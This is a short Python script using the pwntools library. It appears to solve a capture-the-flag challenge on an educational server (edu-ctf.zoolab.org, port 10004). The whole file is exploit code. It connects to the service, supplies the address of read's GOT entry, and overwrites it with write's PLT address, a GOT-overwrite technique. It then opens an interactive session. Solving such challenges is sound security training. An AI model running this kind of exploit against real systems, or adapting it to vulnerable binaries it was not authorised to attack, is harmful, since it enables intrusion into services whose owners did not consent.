from pwn import *

r = remote("edu-ctf.zoolab.org", 10004)

# read@plt -> read@got -> write@plt -> write@got -> write
read_got = 0x404038
write_plt = 0x4010c0

r.sendlineafter(b"Overwrite addr: ", str(read_got).encode("ascii"))
r.sendafter(b"Overwrite 8 bytes value: ", p64(write_plt))

r.interactive()

r.close()